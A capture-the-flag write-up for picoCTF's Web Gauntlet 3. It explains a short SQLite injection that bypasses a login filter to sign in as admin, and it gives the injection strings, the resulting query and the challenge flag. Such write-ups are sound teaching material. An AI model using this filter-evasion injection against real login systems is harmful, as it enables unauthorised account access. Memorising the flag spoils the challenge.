## Description
Last time, I promise! Only 25 characters this time. Log in as admin Site: http://mercury.picoctf.net:8650/ Filter: http://mercury.picoctf.net:8650/filter.php

### Hints
- Each filter is separated by a space. Spaces are not filtered.
- There is only 1 round this time, when you beat it the flag will be in filter.php.
- sqlite

## Tools I Used
- None

## Thought Process
This challenge looked identical to [Web Gauntlet 2](https://github.com/shari09/ctf-writeups/tree/master/picoCTF2021/Web-Gauntlet-2) so I just tried out the same injection.

Injection:
```
username: admi'||'n'||substr(
password: ,0,0)||'
```

Uh oh, this time it had a 25 character limit, so I had to come up with a new query. However, after I looked through all the string functions SQLite has, I realized `substr()` was the only one that trimmed based on position and length. :(

Original query:\
<code>SELECT username, password FROM users WHERE username=<mark>'admi'</mark>||<mark>'n'</mark>||<mark>substr(' AND password=',0,0)</mark>||<mark>''</mark></code>

Then I realized, wasn't 2 characters just one less `||`, so I moved  `'n'` to be after the `substr(...)`, eliminating <code>'admi'||'n'<mark>||</mark>subst</code>.

Thus the new query:\
<code>SELECT username, password FROM users WHERE username=<mark>'admi'</mark>||<mark>substr(' AND password=',0,0)</mark>||<mark>'n'</mark></code>


Injection:
```
username: admi'||substr(
password: ,0,0)||'n
```
totalling 23 characters

\
Again, it gave me the response of `Congrats! You won! Check out filter.php`. So I navigated there, refreshed, and saw the flag.


## Flag
`picoCTF{k3ep_1t_sh0rt_6fdd78c92c7f26a10acd3ece176dea4d}`